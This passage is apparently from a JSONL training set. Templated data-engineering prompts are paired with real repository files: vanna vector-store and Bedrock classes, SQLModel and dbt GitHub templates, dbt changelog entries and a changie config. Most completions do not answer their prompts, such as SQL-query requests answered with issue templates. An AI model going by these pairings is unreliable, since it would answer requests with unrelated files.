vector_search_dimensions=self.dimensions, vector_search_profile_name=\"ExhaustiveKnnProfile\"),\n        ]\n\n        vector_search = VectorSearch(\n            algorithms=[\n                ExhaustiveKnnAlgorithmConfiguration(\n                    name=\"ExhaustiveKnn\",\n                    kind=VectorSearchAlgorithmKind.EXHAUSTIVE_KNN,\n                    parameters=ExhaustiveKnnParameters(\n                        metric=VectorSearchAlgorithmMetric.COSINE\n                    )\n                )\n            ],\n            profiles=[\n                VectorSearchProfile(\n                    name=\"ExhaustiveKnnProfile\",\n                    algorithm_configuration_name=\"ExhaustiveKnn\",\n                )\n            ]\n        )\n\n        index = SearchIndex(name=self.index_name, fields=fields, vector_search=vector_search)\n        result = self.index_client.create_or_update_index(index)\n        print(f'{result.name} created')\n\n    def _get_indexes(self) -> list:\n        return [index for index in self.index_client.list_index_names()]\n\n    def add_ddl(self, ddl: str) -> str:\n        id = deterministic_uuid(ddl) + \"-ddl\"\n        document = {\n            \"id\": id,\n            \"document\": ddl,\n            \"type\": \"ddl\",\n            \"document_vector\": self.generate_embedding(ddl)\n        }\n        self.search_client.upload_documents(documents=[document])\n        return id\n\n    def add_documentation(self, doc: str) -> str:\n        id = deterministic_uuid(doc) + \"-doc\"\n        document = {\n            \"id\": id,\n            \"document\": doc,\n            \"type\": \"doc\",\n            \"document_vector\": self.generate_embedding(doc)\n        }\n        self.search_client.upload_documents(documents=[document])\n        return id\n\n    def add_question_sql(self, question: str, sql: str) -> str:\n        question_sql_json = json.dumps({\"question\": question, \"sql\": sql}, ensure_ascii=False)\n        id = deterministic_uuid(question_sql_json) + \"-sql\"\n        document = {\n            \"id\": id,\n            \"document\": question_sql_json,\n            \"type\": \"sql\",\n            \"document_vector\": self.generate_embedding(question_sql_json)\n        }\n        self.search_client.upload_documents(documents=[document])\n        return id\n\n    def get_related_ddl(self, text: str) -> List[str]:\n        result = []\n        vector_query = VectorizedQuery(vector=self.generate_embedding(text), fields=\"document_vector\")\n        df = pd.DataFrame(\n            self.search_client.search(\n                top=self.n_results_ddl,\n                vector_queries=[vector_query],\n                select=[\"id\", \"document\", \"type\"],\n                filter=f\"type eq 'ddl'\"\n            )\n        )\n\n        if len(df):\n            result = df[\"document\"].tolist()\n        return result\n\n    def get_related_documentation(self, text: str) -> List[str]:\n        result = []\n        vector_query = VectorizedQuery(vector=self.generate_embedding(text), fields=\"document_vector\")\n\n        df = pd.DataFrame(\n            self.search_client.search(\n                top=self.n_results_documentation,\n                vector_queries=[vector_query],\n                select=[\"id\", \"document\", \"type\"],\n                filter=f\"type eq 'doc'\",\n                vector_filter_mode=VectorFilterMode.PRE_FILTER\n            )\n        )\n\n        if len(df):\n            result = df[\"document\"].tolist()\n        return result\n\n    def get_similar_question_sql(self, question: str) -> List[str]:\n        result = []\n        # Vectorize the text\n        vector_query = VectorizedQuery(vector=self.generate_embedding(question), fields=\"document_vector\")\n        df = pd.DataFrame(\n            self.search_client.search(\n                top=self.n_results_sql,\n                vector_queries=[vector_query],\n                select=[\"id\", \"document\", \"type\"],\n                filter=f\"type eq 'sql'\"\n            )\n        )\n\n        if len(df): # Check if there is similar query and the result is not empty\n            result = [ast.literal_eval(element) for element in df[\"document\"].tolist()]\n\n        return result\n\n    def get_training_data(self) -> List[str]:\n\n        search = self.search_client.search(\n            search_text=\"*\",\n            select=['id', 'document', 'type'],\n            filter=f\"(type eq 'sql') or (type eq 'ddl') or (type eq 'doc')\"\n        ).by_page()\n\n        df = pd.DataFrame([item for page in search for item in page])\n\n        if len(df):\n            df.loc[df[\"type\"] == \"sql\", \"question\"] = df.loc[df[\"type\"] == \"sql\"][\"document\"].apply(lambda x: json.loads(x)[\"question\"])\n            df.loc[df[\"type\"] == \"sql\", \"content\"]  = df.loc[df[\"type\"] == \"sql\"][\"document\"].apply(lambda x: json.loads(x)[\"sql\"])\n            df.loc[df[\"type\"] != \"sql\", \"content\"]  = df.loc[df[\"type\"] != \"sql\"][\"document\"]\n\n            return df[[\"id\", \"question\", \"content\", \"type\"]]\n\n        return pd.DataFrame()\n\n    def remove_training_data(self, id: str) -> bool:\n        result = self.search_client.delete_documents(documents=[{'id':id}])\n        return result[0].succeeded\n\n    def remove_index(self):\n        self.index_client.delete_index(self.index_name)\n\n    def generate_embedding(self, data: str, **kwargs) -> List[float]:\n        embedding_model = TextEmbedding(model_name=self.fastembed_model)\n        embedding = next(embedding_model.embed(data))\n        return embedding.tolist()\n", "metadata": {"source": "github.com/vanna-ai/vanna", "file_path": "src/vanna/azuresearch/azuresearch_vector.py", "language": "python", "complexity": "complex", "star_count": 19604, "quality_score": 0.98, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "sql_analytics", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate class-based implementation for Create SQL query for data analytics and reporting\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "from ..base import VannaBase\n\ntry:\n    import boto3\n    from botocore.exceptions import ClientError\nexcept ImportError:\n    raise ImportError(\"Please install boto3 and botocore to use Amazon Bedrock models\")\n\nclass Bedrock_Converse(VannaBase):\n    def __init__(self, client=None, config=None):\n        VannaBase.__init__(self, config=config)\n\n        # default parameters\n        self.temperature = 0.0\n        self.max_tokens = 500\n        \n        if client is None:\n            raise ValueError(\n                \"A valid Bedrock runtime client must be provided to invoke Bedrock models\"\n            )\n        else:\n            self.client = client\n        \n        if config is None:\n            raise ValueError(\n                \"Config is required with model_id and inference parameters\"\n            )\n        \n        if \"modelId\" not in config:\n            raise ValueError(\n                \"config must contain a modelId to invoke\"\n            )\n        else:\n            self.model = config[\"modelId\"]\n        \n        if \"temperature\" in config:\n            self.temperature = config[\"temperature\"]\n        \n        if \"max_tokens\" in config:\n            self.max_tokens = config[\"max_tokens\"]\n\n    def system_message(self, message: str) -> dict:\n        return {\"role\": \"system\", \"content\": message}\n\n    def user_message(self, message: str) -> dict:\n        return {\"role\": \"user\", \"content\": message}\n\n    def assistant_message(self, message: str) -> dict:\n        return {\"role\": \"assistant\", \"content\": message}\n\n    def submit_prompt(self, prompt, **kwargs) -> str:\n        inference_config = {\n            \"temperature\": self.temperature,\n            \"maxTokens\": self.max_tokens\n        }\n        additional_model_fields = {\n            \"top_p\": 1,  # setting top_p value for nucleus sampling\n        }\n\n        system_message = None\n        no_system_prompt = []\n        for prompt_message in prompt:\n            role = prompt_message[\"role\"]\n            if role == \"system\":\n                system_message = prompt_message[\"content\"]\n            else:\n                no_system_prompt.append({\"role\": role, \"content\":[{\"text\": prompt_message[\"content\"]}]})\n\n        converse_api_params = {\n            \"modelId\": self.model,\n            \"messages\": no_system_prompt,\n            \"inferenceConfig\": inference_config,\n            \"additionalModelRequestFields\": additional_model_fields\n        }\n\n        if system_message:\n            converse_api_params[\"system\"] = [{\"text\": system_message}]\n\n        try:\n            response = self.client.converse(**converse_api_params)\n            text_content = response[\"output\"][\"message\"][\"content\"][0][\"text\"]\n            return text_content\n        except ClientError as err:\n            message = err.response[\"Error\"][\"Message\"]\n            raise Exception(f\"A Bedrock client error occurred: {message}\")", "metadata": {"source": "github.com/vanna-ai/vanna", "file_path": "src/vanna/bedrock/bedrock_converse.py", "language": "python", "complexity": "simple", "star_count": 19604, "quality_score": 0.98, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "sql_analytics", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate class-based implementation for Create SQL query for data analytics and reporting\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "labels: [question]\nbody:\n  - type: markdown\n    attributes:\n      value: |\n        Thanks for your interest in SQLModel! 🚀\n\n        Please follow these instructions, fill every question, and do every step. 🙏\n\n        I'm asking this because answering questions and solving problems in GitHub is what consumes most of the time.\n\n        I end up not being able to add new features, fix bugs, review pull requests, etc. as fast as I wish because I have to spend too much time handling questions.\n\n        All that, on top of all the incredible help provided by a bunch of community members that give a lot of their time to come here and help others.\n\n        If more SQLModel users came to help others like them just a little bit more, it would be much less effort for them (and you and me 😅).\n\n        By asking questions in a structured way (following this) it will be much easier to help you.\n\n        And there's a high chance that you will find the solution along the way and you won't even have to submit it and wait for an answer. 😎\n\n        As there are too many questions, I'll have to discard and close the incomplete ones. That will allow me (and others) to focus on helping people like you that follow the whole process and help us help you. 🤓\n  - type: checkboxes\n    id: checks\n    attributes:\n      label: First Check\n      description: Please confirm and check all the following options.\n      options:\n        - label: I added a very descriptive title here.\n          required: true\n        - label: I used the GitHub search to find a similar question and didn't find it.\n          required: true\n        - label: I searched the SQLModel documentation, with the integrated search.\n          required: true\n        - label: I already searched in Google \"How to X in SQLModel\" and didn't find any information.\n          required: true\n        - label: I already read and followed all the tutorial in the docs and didn't find an answer.\n          required: true\n        - label: I already checked if it is not related to SQLModel but to [Pydantic](https://github.com/samuelcolvin/pydantic).\n          required: true\n        - label: I already checked if it is not related to SQLModel but to [SQLAlchemy](https://github.com/sqlalchemy/sqlalchemy).\n          required: true\n  - type: checkboxes\n    id: help\n    attributes:\n      label: Commit to Help\n      description: |\n        After submitting this, I commit to one of:\n\n          * Read open issues with questions until I find 2 issues where I can help someone and add a comment to help there.\n          * I already hit the \"watch\" button in this repository to receive notifications and I commit to help at least 2 people that ask questions in the future.\n          * Review one Pull Request by downloading the code and following all the review process](https://sqlmodel.tiangolo.com/help/#review-pull-requests).\n\n      options:\n        - label: I commit to help with one of those options 👆\n          required: true\n  - type: textarea\n    id: example\n    attributes:\n      label: Example Code\n      description: |\n        Please add a self-contained, [minimal, reproducible, example](https://stackoverflow.com/help/minimal-reproducible-example) with your use case.\n\n        If I (or someone) can copy it, run it, and see it right away, there's a much higher chance I (or someone) will be able to help you.\n\n      placeholder: |\n        from sqlmodel import Field, Session, SQLModel, create_engine\n\n\n        class Hero(SQLModel, table=True):\n            id: int | None = Field(default=None, primary_key=True)\n            name: str\n            secret_name: str\n            age: int | None = None\n\n\n        hero_1 = Hero(name=\"Deadpond\", secret_name=\"Dive Wilson\")\n\n        engine = create_engine(\"sqlite:///database.db\")\n\n\n        SQLModel.metadata.create_all(engine)\n\n        with Session(engine) as session:\n            session.add(hero_1)\n            session.commit()\n            session.refresh(hero_1)\n            print(hero_1)\n      render: python\n    validations:\n      required: true\n  - type: textarea\n    id: description\n    attributes:\n      label: Description\n      description: |\n        What is the problem, question, or error?\n\n        Write a short description telling me what you are doing, what you expect to happen, and what is currently happening.\n      placeholder: |\n        * Create a Hero model.\n        * Create a Hero instance.\n        * Save it to a SQLite database.\n        * Check the data with DB Browser for SQLite.\n        * There's only one hero there, but I expected it to include many others recruited by the first one.\n    validations:\n      required: true\n  - type: dropdown\n    id: os\n    attributes:\n      label: Operating System\n      description: What operating system are you on?\n      multiple: true\n      options:\n        - Linux\n        - Windows\n        - macOS\n        - Other\n    validations:\n      required: true\n  - type: textarea\n    id: os-details\n    attributes:\n      label: Operating System Details\n      description: You can add more details about your operating system here, in particular if you chose \"Other\".\n  - type: input\n    id: sqlmodel-version\n    attributes:\n      label: SQLModel Version\n      description: |\n        What SQLModel version are you using?\n\n        You can find the SQLModel version with:\n\n        ```bash\n        python -c \"import sqlmodel; print(sqlmodel.__version__)\"\n        ```\n    validations:\n      required: true\n  - type: input\n    id: python-version\n    attributes:\n      label: Python Version\n      description: |\n        What Python version are you using?\n\n        You can find the Python version with:\n\n        ```bash\n        python --version\n        ```\n    validations:\n      required: true\n  - type: textarea\n    id: context\n    attributes:\n      label: Additional Context\n      description: Add any additional context information or screenshots you think are useful.\n", "metadata": {"source": "github.com/fastapi/sqlmodel", "file_path": ".github/DISCUSSION_TEMPLATE/questions.yml", "language": "yaml", "complexity": "medium", "star_count": 16412, "quality_score": 0.89, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "sql_analytics", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create SQL query for data analytics and reporting\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "blank_issues_enabled: false\ncontact_links:\n  - name: Security Contact\n    about: Please report security vulnerabilities to security@tiangolo.com\n  - name: Question or Problem\n    about: Ask a question or ask about a problem in GitHub Discussions.\n    url: https://github.com/fastapi/sqlmodel/discussions/categories/questions\n  - name: Feature Request\n    about: To suggest an idea or ask about a feature, please start with a question saying what you would like to achieve. There might be a way to do it already.\n    url: https://github.com/fastapi/sqlmodel/discussions/categories/questions\n  - name: Show and tell\n    about: Show what you built with SQLModel or to be used with SQLModel.\n    url: https://github.com/fastapi/sqlmodel/discussions/categories/show-and-tell\n", "metadata": {"source": "github.com/fastapi/sqlmodel", "file_path": ".github/ISSUE_TEMPLATE/config.yml", "language": "yaml", "complexity": "simple", "star_count": 16412, "quality_score": 0.8, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "sql_analytics", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create SQL query for data analytics and reporting\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: Add to Project\n\non:\n  pull_request_target:\n  issues:\n    types:\n      - opened\n      - reopened\n\njobs:\n  add-to-project:\n    name: Add to project\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/add-to-project@v1.0.2\n        with:\n          project-url: https://github.com/orgs/fastapi/projects/2\n          github-token: ${{ secrets.PROJECTS_TOKEN }}\n", "metadata": {"source": "github.com/fastapi/sqlmodel", "file_path": ".github/workflows/add-to-project.yml", "language": "yaml", "complexity": "simple", "star_count": 16412, "quality_score": 0.8, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_modeling", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create data model for warehouse dimensional design\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "kind: Dependencies\nbody: Bump dbt-common minimum to 1.25.1\ntime: 2025-07-02T14:47:20.772002-05:00\ncustom:\n  Author: QMalcolm\n  Issue: \"11789\"\n", "metadata": {"source": "github.com/dbt-labs/dbt-core", "file_path": ".changes/unreleased/Dependencies-20250702-144720.yaml", "language": "yaml", "complexity": "simple", "star_count": 11147, "quality_score": 0.6000000000000001, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_modeling", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create data model for warehouse dimensional design\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "kind: Dependencies\nbody: Upgrade to dbt-semantic-interfaces==0.9.0 for more robust saved query support.\ntime: 2025-07-09T13:22:13.688162-07:00\ncustom:\n  Author: courtneyholcomb\n  Issue: \"11809\"\n", "metadata": {"source": "github.com/dbt-labs/dbt-core", "file_path": ".changes/unreleased/Dependencies-20250709-132213.yaml", "language": "yaml", "complexity": "simple", "star_count": 11147, "quality_score": 0.6000000000000001, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_modeling", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create data model for warehouse dimensional design\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "kind: Features\nbody: Add file_format to catalog integration config\ntime: 2025-05-29T08:53:11.64904-07:00\ncustom:\n  Author: colin-rogers-dbt\n  Issue: \"11695\"\n", "metadata": {"source": "github.com/dbt-labs/dbt-core", "file_path": ".changes/unreleased/Features-20250529-085311.yaml", "language": "yaml", "complexity": "simple", "star_count": 11147, "quality_score": 0.6300000000000001, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_modeling", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create data model for warehouse dimensional design\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "kind: Features\nbody: \"11561\"\ntime: 2025-06-11T16:02:17.334525-04:00\ncustom:\n  Author: michelleark\n  Issue: deprecate --models,--model, and -m flags\n", "metadata": {"source": "github.com/dbt-labs/dbt-core", "file_path": ".changes/unreleased/Features-20250611-160217.yaml", "language": "yaml", "complexity": "simple", "star_count": 11147, "quality_score": 0.6000000000000001, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_modeling", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create data model for warehouse dimensional design\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "kind: Features\nbody: Update jsonschemas with builtin data test properties and exposure configs in\n  dbt_project.yml for more accurate deprecations\ntime: 2025-06-17T14:25:16.976867-04:00\ncustom:\n  Author: michelleark\n  Issue: \"11335\"\n", "metadata": {"source": "github.com/dbt-labs/dbt-core", "file_path": ".changes/unreleased/Features-20250617-142516.yaml", "language": "yaml", "complexity": "simple", "star_count": 11147, "quality_score": 0.6300000000000001, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_modeling", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create data model for warehouse dimensional design\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "kind: Features\nbody: Begin validating configs from model sql files\ntime: 2025-06-25T15:18:18.164-05:00\ncustom:\n  Author: QMalcolm\n  Issue: \"11727\"\n", "metadata": {"source": "github.com/dbt-labs/dbt-core", "file_path": ".changes/unreleased/Features-20250625-151818.yaml", "language": "yaml", "complexity": "simple", "star_count": 11147, "quality_score": 0.6600000000000001, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_modeling", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create data model for warehouse dimensional design\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "kind: Features\nbody: Create constrained namespace for dbt engine env vars\ntime: 2025-07-03T17:53:41.406701-05:00\ncustom:\n  Author: QMalcolm\n  Issue: \"11340\"\n", "metadata": {"source": "github.com/dbt-labs/dbt-core", "file_path": ".changes/unreleased/Features-20250703-175341.yaml", "language": "yaml", "complexity": "simple", "star_count": 11147, "quality_score": 0.6000000000000001, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_modeling", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create data model for warehouse dimensional design\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "kind: Fixes\nbody: Ensure build_after is present in model freshness in parsing, otherwise skip\n  freshness definition\ntime: 2025-06-05T11:06:45.329942-07:00\ncustom:\n  Author: QMalcolm\n  Issue: \"11709\"\n", "metadata": {"source": "github.com/dbt-labs/dbt-core", "file_path": ".changes/unreleased/Fixes-20250605-110645.yaml", "language": "yaml", "complexity": "simple", "star_count": 11147, "quality_score": 0.6000000000000001, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_modeling", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create data model for warehouse dimensional design\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "kind: Fixes\nbody: ignore invalid model freshness configs in inline model configs\ntime: 2025-06-10T21:12:41.972614-07:00\ncustom:\n  Author: colin-rogers-dbt\n  Issue: \"11728\"\n", "metadata": {"source": "github.com/dbt-labs/dbt-core", "file_path": ".changes/unreleased/Fixes-20250610-211241.yaml", "language": "yaml", "complexity": "simple", "star_count": 11147, "quality_score": 0.6300000000000001, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_modeling", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create data model for warehouse dimensional design\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "kind: Fixes\nbody: \"Remove model freshness property support in favor of config level support\"\ntime: 2025-06-16T08:56:00.641553-05:00\ncustom:\n  Author: QMalcolm\n  Issue: \"11713\"\n", "metadata": {"source": "github.com/dbt-labs/dbt-core", "file_path": ".changes/unreleased/Fixes-20250616-085600.yaml", "language": "yaml", "complexity": "simple", "star_count": 11147, "quality_score": 0.6300000000000001, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_modeling", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create data model for warehouse dimensional design\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "kind: Fixes\nbody: Bump dbt-common to 1.25.0 to access WarnErrorOptionsV2\ntime: 2025-06-24T09:12:58.904713-04:00\ncustom:\n  Author: michelleark\n  Issue: \"11755\"\n", "metadata": {"source": "github.com/dbt-labs/dbt-core", "file_path": ".changes/unreleased/Fixes-20250624-091258.yaml", "language": "yaml", "complexity": "simple", "star_count": 11147, "quality_score": 0.6000000000000001, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_modeling", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create data model for warehouse dimensional design\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "kind: Fixes\nbody: ensure consistent casing in column names while processing user unit tests\ntime: 2025-06-24T15:20:47.589212-07:00\ncustom:\n  Author: colin-rogers-dbt\n  Issue: \"11770\"\n", "metadata": {"source": "github.com/dbt-labs/dbt-core", "file_path": ".changes/unreleased/Fixes-20250624-152047.yaml", "language": "yaml", "complexity": "simple", "star_count": 11147, "quality_score": 0.6000000000000001, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_modeling", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create data model for warehouse dimensional design\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "kind: Fixes\nbody: raise MissingPlusPrefixDeprecation instead of GenericJSONSchemaValidationDeprecation when config missing plus prefix in dbt_project.yml\ntime: 2025-07-14T18:41:31.322137-04:00\ncustom:\n    Author: michelleark\n    Issue: \"11826\"\n", "metadata": {"source": "github.com/dbt-labs/dbt-core", "file_path": ".changes/unreleased/Fixes-20250714-184131.yaml", "language": "yaml", "complexity": "simple", "star_count": 11147, "quality_score": 0.6300000000000001, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_modeling", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create data model for warehouse dimensional design\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "changesDir: .changes\nunreleasedDir: unreleased\nheaderPath: header.tpl.md\nversionHeaderPath: \"\"\nchangelogPath: CHANGELOG.md\nversionExt: md\nenvPrefix: \"CHANGIE_\"\nversionFormat: '## dbt-core {{.Version}} - {{.Time.Format \"January 02, 2006\"}}'\nkindFormat: '### {{.Kind}}'\nchangeFormat: |-\n  {{- $IssueList := list }}\n  {{- $changes := splitList \" \" $.Custom.Issue }}\n  {{- range $issueNbr := $changes }}\n    {{- $changeLink := \"[#nbr](https://github.com/dbt-labs/dbt-core/issues/nbr)\" | replace \"nbr\" $issueNbr }}\n    {{- $IssueList = append $IssueList $changeLink  }}\n  {{- end -}}\n  - {{.Body}} ({{ range $index, $element := $IssueList }}{{if $index}}, {{end}}{{$element}}{{end}})\n\nkinds:\n  - label: Breaking Changes\n  - label: Features\n  - label: Fixes\n  - label: Docs\n    changeFormat: |-\n      {{- $IssueList := list }}\n      {{- $changes := splitList \" \" $.Custom.Issue }}\n      {{- range $issueNbr := $changes }}\n        {{- $changeLink := \"[dbt-docs/#nbr](https://github.com/dbt-labs/dbt-docs/issues/nbr)\" | replace \"nbr\" $issueNbr }}\n        {{- $IssueList = append $IssueList $changeLink }}\n      {{- end -}}\n      - {{.Body}} ({{ range $index, $element := $IssueList }}{{if $index}}, {{end}}{{$element}}{{end}})\n  - label: Under the Hood\n  - label: Dependencies\n  - label: Security\n\nnewlines:\n  afterChangelogHeader: 1\n  afterKind: 1\n  afterChangelogVersion: 1\n  beforeKind: 1\n  endOfVersion: 1\n\ncustom:\n- key: Author\n  label: GitHub Username(s) (separated by a single space if multiple)\n  type: string\n  minLength: 3\n- key: Issue\n  label: GitHub Issue Number (separated by a single space if multiple)\n  type: string\n  minLength: 1\n\nfooterFormat: |\n  {{- $contributorDict := dict }}\n  {{- /* ensure all names in this list are all lowercase for later matching purposes */}}\n  {{- $core_team := splitList \" \" .Env.CORE_TEAM }}\n  {{- /* ensure we always skip snyk and dependabot in addition to the core team */}}\n  {{- $maintainers := list \"dependabot[bot]\" \"snyk-bot\"}}\n  {{- range $team_member := $core_team }}\n    {{- $team_member_lower := lower $team_member }}\n    {{- $maintainers = append $maintainers $team_member_lower }}\n  {{- end }}\n  {{- range $change := .Changes }}\n    {{- $authorList := splitList \" \" $change.Custom.Author }}\n    {{- /* loop through all authors for a single changelog */}}\n    {{- range $author := $authorList }}\n      {{- $authorLower := lower $author }}\n      {{- /* we only want to include non-core team contributors */}}\n      {{- if not (has $authorLower $maintainers)}}\n        {{- $changeList := splitList \" \" $change.Custom.Author }}\n          {{- $IssueList := list }}\n          {{- $changeLink := $change.Kind }}\n          {{- $changes := splitList \" \" $change.Custom.Issue }}\n          {{- range $issueNbr := $changes }}\n            {{- $changeLink := \"[#nbr](https://github.com/dbt-labs/dbt-core/issues/nbr)\" | replace \"nbr\" $issueNbr }}\n            {{- $IssueList = append $IssueList $changeLink  }}\n          {{- end }}\n          {{- /* check if this contributor has other changes associated with them already */}}\n          {{- if hasKey $contributorDict $author }}\n            {{- $contributionList := get $contributorDict $author }}\n            {{- $contributionList = concat $contributionList $IssueList  }}\n            {{- $contributorDict := set $contributorDict $author $contributionList }}\n          {{- else }}\n            {{- $contributionList := $IssueList }}\n            {{- $contributorDict := set $contributorDict $author $contributionList }}\n          {{- end }}\n        {{- end}}\n    {{- end}}\n  {{- end }}\n  {{- /* no indentation here for formatting so the final markdown doesn't have unneeded indentations */}}\n  {{- if $contributorDict}}\n  ### Contributors\n  {{- range $k,$v := $contributorDict }}\n  - [@{{$k}}](https://github.com/{{$k}}) ({{ range $index, $element := $v }}{{if $index}}, {{end}}{{$element}}{{end}})\n  {{- end }}\n  {{- end }}\n", "metadata": {"source": "github.com/dbt-labs/dbt-core", "file_path": ".changie.yaml", "language": "yaml", "complexity": "simple", "star_count": 11147, "quality_score": 0.8, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_modeling", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create data model for warehouse dimensional design using Spark for big data processing\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: 🐞 Bug\ndescription: Report a bug or an issue you've found with dbt\ntitle: \"[Bug] <title>\"\nlabels: [\"bug\", \"triage\"]\nbody:\n  - type: markdown\n    attributes:\n      value: |\n        Thanks for taking the time to fill out this bug report!\n  - type: checkboxes\n    attributes:\n      label: Is this a new bug in dbt-core?\n      description: >\n        In other words, is this an error, flaw, failure or fault in our software?\n\n        If this is a bug that broke existing functionality that used to work, please open a regression issue.\n        If this is a bug in an adapter plugin, please open an issue in the adapter's repository.\n        If this is a bug experienced while using dbt Cloud, please report to [support](mailto:support@getdbt.com).\n        If this is a request for help or troubleshooting code in your own dbt project, please join our [dbt Community Slack](https://www.getdbt.com/community/join-the-community/) or open a [Discussion question](https://github.com/dbt-labs/docs.getdbt.com/discussions).\n\n        Please search to see if an issue already exists for the bug you encountered.\n      options:\n        - label: I believe this is a new bug in dbt-core\n          required: true\n        - label: I have searched the existing issues, and I could not find an existing issue for this bug\n          required: true\n  - type: textarea\n    attributes:\n      label: Current Behavior\n      description: A concise description of what you're experiencing.\n    validations:\n      required: true\n  - type: textarea\n    attributes:\n      label: Expected Behavior\n      description: A concise description of what you expected to happen.\n    validations:\n      required: true\n  - type: textarea\n    attributes:\n      label: Steps To Reproduce\n      description: Steps to reproduce the behavior.\n      placeholder: |\n        1. In this environment...\n        2. With this config...\n        3. Run '...'\n        4. See error...\n    validations:\n      required: true\n  - type: textarea\n    id: logs\n    attributes:\n      label: Relevant log output\n      description: |\n        If applicable, log output to help explain your problem.\n      render: shell\n    validations:\n      required: false\n  - type: textarea\n    attributes:\n      label: Environment\n      description: |\n        examples:\n          - **OS**: Ubuntu 24.04\n          - **Python**: 3.9.12 (`python3 --version`)\n          - **dbt-core**: 1.1.1 (`dbt --version`)\n      value: |\n        - OS:\n        - Python:\n        - dbt:\n      render: markdown\n    validations:\n      required: false\n  - type: dropdown\n    id: database\n    attributes:\n      label: Which database adapter are you using with dbt?\n      description: If the bug is specific to the database or adapter, please open the issue in that adapter's repository instead\n      multiple: true\n      options:\n        - postgres\n        - redshift\n        - snowflake\n        - bigquery\n        - spark\n        - other (mention 